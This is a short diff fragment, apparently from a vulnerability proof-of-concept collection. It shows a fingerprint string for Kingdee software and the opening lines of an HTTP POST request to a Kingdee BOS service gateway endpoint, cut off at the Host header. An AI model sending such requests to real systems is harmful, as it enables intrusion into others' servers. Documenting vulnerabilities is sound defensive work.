@@ -8,7 +8,7 @@ body="kdUtils.min.js"
 ```
 
 
-## poc
+## POC
 ```
 POST /Kingdee.BOS.ServiceFacade.ServicesStub.ServiceGateway.GetServiceUri.common.kdsvc HTTP/1.1
 Host: 
